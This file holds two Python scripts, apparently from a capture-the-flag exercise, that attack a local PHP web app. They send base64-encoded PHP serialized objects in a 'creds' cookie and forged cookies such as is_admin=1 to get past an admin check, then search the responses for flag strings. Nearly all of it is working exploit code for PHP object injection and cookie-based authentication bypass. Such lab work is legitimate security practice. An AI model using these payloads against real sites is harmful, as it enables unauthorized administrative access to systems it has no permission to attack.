import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# The key insight: when object injection causes Fatal error, 
# the error happens AFTER the deserialization
# Maybe the code flow is:
# 1. Deserialize cookie
# 2. Check admin
# 3. Display flag if admin
# 4. Use data (which causes error if object)

# So if we can bypass admin check, we might see flag before the error

print("[*] Testing object injection to bypass admin check and see flag...\n")

# Let me try injecting stdClass with isAdmin property
# When PHP tries to use stdClass as array, it fails
# But maybe before that, the admin check passes

payloads = [
    # stdClass with isAdmin property
    ('stdClass_isAdmin', 'O:8:"stdClass":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:7:"isAdmin";b:1;}'),
    
    # Try with different casing
    ('stdClass_is_admin', 'O:8:"stdClass":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:8:"is_admin";b:1;}'),
    
    # Try with admin property
    ('stdClass_admin_prop', 'O:8:"stdClass":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:5:"admin";b:1;}'),
    
    # Try with role property
    ('stdClass_role', 'O:8:"stdClass":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:4:"role";s:5:"admin";}'),
]

for name, payload in payloads:
    print(f"[*] Testing {name}...")
    
    payload_b64 = base64.b64encode(payload.encode()).decode()
    
    # Test WITHOUT is_admin cookie - purely rely on object injection
    headers = {'Cookie': f'creds={payload_b64}'}
    resp = requests.get(base_url, headers=headers)
    
    print(f"    WITHOUT is_admin cookie: {len(resp.content)}B")
    
    # Check for fatal error AND flag
    has_fatal = "Fatal error" in resp.text
    has_flag = "FLAG" in resp.text or "flag{" in resp.text.lower()
    has_rejection = "you are not the admin" in resp.text
    
    if has_fatal:
        print(f"    Has Fatal error")
    if has_rejection:
        print(f"    Still rejected")
    else:
        print(f"    [+] NOT REJECTED!")
    if has_flag:
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
        if flag_match:
            print(f"    [!!!] FLAG: {flag_match.group(1)}")
    
    # Also test WITH is_admin cookie
    headers2 = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp2 = requests.get(base_url, headers=headers2)
    
    has_rejection2 = "you are not the admin" in resp2.text
    has_flag2 = "FLAG" in resp2.text or "flag{" in resp2.text.lower()
    
    print(f"    WITH is_admin=1: {len(resp2.content)}B {'[REJECTED]' if has_rejection2 else '[NOT REJECTED]'}")
    
    if has_flag2:
        flag_match = re.search(r'(FLAG\{[^}]+\})', resp2.text, re.IGNORECASE)
        if flag_match:
            print(f"    [!!!] FLAG: {flag_match.group(1)}")
    
    print()

print("="*80 + "\n")

# Let me also try to understand what the admin check might be
# Maybe it checks for a specific session value or cookie

print("[*] Testing various cookie combinations...\n")

cookie_tests = [
    ('admin_cookie', {'Cookie': 'admin=1'}),
    ('admin_session', {'Cookie': 'session=admin'}),
    ('user_admin', {'Cookie': 'user=admin'}),
    ('role_admin', {'Cookie': 'role=admin'}),
    ('authenticated', {'Cookie': 'authenticated=1'}),
    ('logged_in', {'Cookie': 'logged_in=1'}),
    ('access_admin', {'Cookie': 'access=admin'}),
    ('flag_show', {'Cookie': 'flag=show'}),
    ('show_flag', {'Cookie': 'show_flag=1'}),
]

for name, headers in cookie_tests:
    resp = requests.get(base_url, headers=headers)
    
    has_rejection = "you are not the admin" in resp.text
    
    if not has_rejection or len(resp.content) != 3188:
        print(f"    {name}: {len(resp.content)}B {'[NOT REJECTED]' if not has_rejection else ''}")
        
        if "FLAG" in resp.text or "flag{" in resp.text.lower():
            flag_match = re.search(r'(FLAG\{[^}]+\})', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] FLAG: {flag_match.group(1)}")

import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

print("[*] Full response for stdClass injection (NOT REJECTED)...\n")

payload = 'O:8:"stdClass":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:7:"isAdmin";b:1;}'
payload_b64 = base64.b64encode(payload.encode()).decode()

headers = {'Cookie': f'creds={payload_b64}'}
resp = requests.get(base_url, headers=headers)

print(f"Payload: {payload}")
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.content)}B")

print(f"\n[+] FULL RESPONSE:\n")
print(resp.text)

print("\n" + "="*80 + "\n")

# Search for flag patterns
print("[*] Searching for flag patterns...")

# All possible flag formats
patterns = [
    r'FLAG\{[^}]+\}',
    r'flag\{[^}]+\}',
    r'AUTH\{[^}]+\}',
    r'CTF\{[^}]+\}',
    r'FLAG\[[^\]]+\]',
    r'flag\[[^\]]+\]',
    r'[A-Z]{3,}\{[^}]{10,}\}',
]

for pattern in patterns:
    matches = re.findall(pattern, resp.text, re.IGNORECASE)
    if matches:
        print(f"    Pattern '{pattern}': {matches}")

# Look for any base64 strings that might decode to a flag
b64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
if b64_matches:
    print(f"\n[*] Checking base64 strings...")
    for b64 in b64_matches:
        try:
            decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
            if 'flag' in decoded.lower() or 'FLAG' in decoded:
                print(f"    {b64} -> {decoded}")
        except:
            pass

# Look for HTML before the error
print("\n[*] Content BEFORE error:")
error_pos = resp.text.find('<b>Fatal error</b>')
if error_pos > 0:
    before_error = resp.text[:error_pos]
    # Extract the content after form
    content_match = re.search(r'</form>(.*)', before_error, re.DOTALL)
    if content_match:
        print(content_match.group(1).strip())

print("\n" + "="*80 + "\n")

